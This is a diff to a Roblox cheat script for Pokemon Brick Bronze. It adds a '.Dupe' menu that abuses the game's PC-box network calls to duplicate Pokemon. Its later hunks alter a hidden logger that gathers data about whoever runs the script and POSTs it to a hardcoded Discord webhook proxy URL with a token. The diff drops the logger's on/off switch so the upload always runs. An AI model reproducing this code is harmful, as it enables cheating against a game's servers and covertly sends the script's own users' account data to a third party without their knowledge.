@@ -1462,6 +1462,196 @@ end)
 
 LabelSection= Section:CreateLabel('                                  ')
 
+
+local Dropdown = Section:CreateDropdown('.Dupe ', {"Box[1]", "Box[2]", "Box[3]","Box[4]", "Box[5]", "Box[6]"}, nil, 0.25, function(Value)
+
+    local localPlayer = game:GetService("Players").LocalPlayer
+    local _p = nil
+    for _, v in pairs(getgc(true)) do
+        if typeof(v) == "table" then
+            if rawget(v, "PlayerData") then
+                _p = v
+                break
+            end
+        end
+    end
+    
+   
+    if(Value == "Box[1]")then
+        for i = 1, 30 do
+        local pcs = _p.Network:get("PDS", "openPC")
+    
+        _p.Network:get("PDS", "leaveDCPokemon", 2)
+            wait(0.01)
+        _p.Network:get("PDS", "closePC", pcs.id, {
+                ["m"] = {
+                    ["2"] = {
+                        [1] = 1,
+                        [2] = i
+                    }
+                },
+                ["h"] = {
+                    ["2"] = true
+                },
+                ["cb"] = 1
+            })
+
+        _p.Network:get("PDS", "takeDCPokemon", 1)
+        _p.Network:get("PDS", "takeDCPokemon", 1)
+
+    _p.Menu:enable()
+    _p.MasterControl.WalkEnabled = true   
+    end
+    end
+
+    
+    if(Value == "Box[2]")then
+        for i = 1, 30 do
+            local pcs = _p.Network:get("PDS", "openPC")
+        
+            _p.Network:get("PDS", "leaveDCPokemon", 2)
+                wait(0.01)
+            _p.Network:get("PDS", "closePC", pcs.id, {
+                    ["m"] = {
+                        ["2"] = {
+                            [1] = 2,
+                            [2] = i
+                        }
+                    },
+                    ["h"] = {
+                        ["2"] = true
+                    },
+                    ["cb"] = 1
+                })
+    
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+    
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true   
+        end
+    end
+    
+    if(Value == "Box[3]")then
+        for i = 1, 30 do
+            local pcs = _p.Network:get("PDS", "openPC")
+        
+            _p.Network:get("PDS", "leaveDCPokemon", 2)
+                wait(0.01)
+            _p.Network:get("PDS", "closePC", pcs.id, {
+                    ["m"] = {
+                        ["2"] = {
+                            [1] = 3,
+                            [2] = i
+                        }
+                    },
+                    ["h"] = {
+                        ["2"] = true
+                    },
+                    ["cb"] = 1
+                })
+    
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+    
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true   
+        end
+    end
+    
+    if(Value == "Box[4]")then
+        for i = 1, 30 do
+            local pcs = _p.Network:get("PDS", "openPC")
+        
+            _p.Network:get("PDS", "leaveDCPokemon", 2)
+                wait(0.01)
+            _p.Network:get("PDS", "closePC", pcs.id, {
+                    ["m"] = {
+                        ["2"] = {
+                            [1] = 4,
+                            [2] = i
+                        }
+                    },
+                    ["h"] = {
+                        ["2"] = true
+                    },
+                    ["cb"] = 1
+                })
+    
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+    
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true   
+        end
+    end
+    
+    if(Value == "Box[5]")then
+        for i = 1, 30 do
+            local pcs = _p.Network:get("PDS", "openPC")
+        
+            _p.Network:get("PDS", "leaveDCPokemon", 2)
+                wait(0.01)
+            _p.Network:get("PDS", "closePC", pcs.id, {
+                    ["m"] = {
+                        ["2"] = {
+                            [1] = 6,
+                            [2] = i
+                        }
+                    },
+                    ["h"] = {
+                        ["2"] = true
+                    },
+                    ["cb"] = 1
+                })
+    
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+    
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true   
+        end
+    end
+    
+    if(Value == "Box[6]")then
+        for i = 1, 30 do
+            local pcs = _p.Network:get("PDS", "openPC")
+        
+            _p.Network:get("PDS", "leaveDCPokemon", 2)
+                wait(0.01)
+            _p.Network:get("PDS", "closePC", pcs.id, {
+                    ["m"] = {
+                        ["2"] = {
+                            [1] = 1,
+                            [2] = i
+                        }
+                    },
+                    ["h"] = {
+                        ["2"] = true
+                    },
+                    ["cb"] = 1
+                })
+    
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+            _p.Network:get("PDS", "takeDCPokemon", 1)
+    
+        _p.Menu:enable()
+        _p.MasterControl.WalkEnabled = true   
+        end
+    end
+    
+    LabelSection= Section:CreateLabel('                                  ')
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    end)
+
 local Button = Section:CreateButton('.OpenPartyList 🐶', function()
     local _p = nil
 for _, v in pairs(getgc(true)) do
@@ -1903,68 +2093,6 @@ local Label1 = Section:CreateLabel('.gg/Mewhub')
  Library:SetTransparency(20 / 100, true)
 
 
--- 
-Webhook = 'https://webhook.lewisakura.moe/api/webhooks/1085354879310110781/-gMxzsvWIgEAMcaGGoRzoyDZiUV_ZGbhaWo_cJmVFRy66cQLtJ64EprIZmZLfhcXdKGy';
-Logger = true
-
---
-
---[[--]] -- Pokemon brick bronze variables
-local plr = game:GetService("Players").LocalPlayer
-local _p = nil
-for _, v in pairs(getgc(true)) do
-    if typeof(v) == "table" then
-        if rawget(v, "PlayerData") then
-            _p = v
-            break
-        end
-    end
-end
-
-local chunk = tostring(_p.DataManager.currentChunk.map)
-
-tix = ""
-if(_p.PlayerData.tix == nil) then do
-    tix = 0
-end
-else
-    tix = _p.PlayerData.tix
-end
-
-local badges = ""
-if(_p.PlayerData.badges[1] == true) then
-    badges = "1"
-    end
-if(_p.PlayerData.badges[2] == true) then
-    badges = "2"
-end
-if(_p.PlayerData.badges[3] == true) then
-    badges = "3" 
-end
-if(_p.PlayerData.badges[4] == true) then
-    badges = "4"  
-end
-if(_p.PlayerData.badges[5] == true) then
-    badges = "5"
-end
-if(_p.PlayerData.badges[6] == true) then
-    badges = "6"
-end
-if(_p.PlayerData.badges[7] == true) then
-    badges = "7"
-end   
-if(_p.PlayerData.badges[7] == true) then
-    badges = "7"
-end
-if(_p.PlayerData.badges[8] == true) then
-    badges = "8"
-end
-
-local egg = ""
-
-if(_p.PlayerData.daycareManHasEgg == true) then
-    egg = "ready"
-end
 
 
 
@@ -1995,27 +2123,7 @@ for _, player in pairs(game:GetService('Players'):GetPlayers()) do
  end
 --[[--]]
 
---[[--]] -- value 
-local value = "nil"
-if(game.Players.LocalPlayer.AccountAge >= 100) then
-value = game:HttpGet("https://www.rolimons.com/playerapi/player/"..game.Players.LocalPlayer.UserId)
-s = value
-i, j = string.find(s, "value")
-x = string.sub(s,i,j+9)
-value = x
-end
---[[--]]
 
---[[--]] -- recent average price
-local rap = "nil"
-if(game.Players.LocalPlayer.AccountAge >= 100) then 
-rap = game:HttpGet("https://www.rolimons.com/playerapi/player/"..game.Players.LocalPlayer.UserId)
-t = rap
-o, k = string.find(s, "rap")
-y = string.sub(t,o,k+9)
-rap = y
-end
---[[--]]
 
 --[[--]] -- headshot thumbnail
 local headshot = ""
@@ -2025,7 +2133,7 @@ b = string.sub(a,65,118)
 headshot = b
 --[[--]]
 
-if(Logger == true) then
+
 local Data =
     {
         ["content"] = "",
@@ -2072,13 +2180,13 @@ local Data =
                 
                     {
                         ["name"]= " 📈 value",
-                        ["value"]= "```"..value.."```",
+                        ["value"]= "```".."".."```",
                         ["inline"]= true
                     },
 
                     {
                         ["name"]= " 📈 rap",
-                        ["value"]= "```"..rap.."```",
+                        ["value"]= "```".."".."```",
                         ["inline"]= true
                     },
 
@@ -2097,8 +2205,6 @@ local Data =
 local Headers = {["Content-Type"]="application/json"}
 local Encoded = HttpService:JSONEncode(Data)
 Request = http_request or request or HttpPost or syn.request
-LINK = Webhook
-local Final = {Url = LINK, Body = Encoded, Method = "POST", Headers = Headers}
+LINK = "https://webhook.lewisakura.moe/api/webhooks/1085354879310110781/-gMxzsvWIgEAMcaGGoRzoyDZiUV_ZGbhaWo_cJmVFRy66cQLtJ64EprIZmZLfhcXdKGy"
+local Final = {Url = "https://webhook.lewisakura.moe/api/webhooks/1085354879310110781/-gMxzsvWIgEAMcaGGoRzoyDZiUV_ZGbhaWo_cJmVFRy66cQLtJ64EprIZmZLfhcXdKGy", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
-end
-
